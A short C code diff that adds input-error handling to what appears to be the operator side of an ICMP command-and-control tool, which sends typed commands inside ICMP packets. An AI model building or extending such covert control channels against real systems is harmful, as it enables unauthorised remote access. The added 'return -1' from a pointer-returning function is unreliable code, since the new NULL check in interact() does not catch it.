@@ -43,7 +43,10 @@ unsigned char *get_command(char *input) {
     CHECK_ALLOC(cipher_text);
 
     write(1, "> ", 2);
-    fgets(input, BUFFER_SIZE, stdin);
+    if (fgets(input, BUFFER_SIZE, stdin) == NULL) {
+        perror("fgets()");
+        return -1;
+    }
 
     input_size = strlen(input);
 
@@ -116,6 +119,9 @@ void interact(int sockfd) {
 
     while (1) {
         command = get_command(input);
+        if (!command) {
+            break;
+        }
 
         c2_append_to_data_section(icmp, command);
 
